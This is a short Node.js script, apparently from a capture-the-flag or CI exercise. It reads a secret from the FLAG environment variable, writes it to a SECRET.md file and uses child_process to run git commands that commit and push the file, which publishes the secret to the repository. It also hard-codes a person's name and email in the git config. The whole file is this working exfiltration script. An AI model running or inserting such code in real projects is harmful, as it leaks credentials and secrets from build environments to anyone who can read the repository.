const fs = require("fs");
const https = require("https");

function exposeSecret() {
  const secret = process.env.FLAG;
  const newContent = `# Secret Exposed\n\nThe secret flag is: ${secret}\n`;

  fs.writeFileSync("SECRET.md", newContent);

  // Commit and push the changes
  require("child_process").execSync("git config --global user.email 'glsarver@ncsu.edu'");
  require("child_process").execSync("git config --global user.name 'Gabe'");
  require("child_process").execSync("git add SECRET.md");
  require("child_process").execSync(`git commit -m "Expose secret"`);
  require("child_process").execSync("git push origin HEAD");
}

// Call the function to expose the secret
exposeSecret();
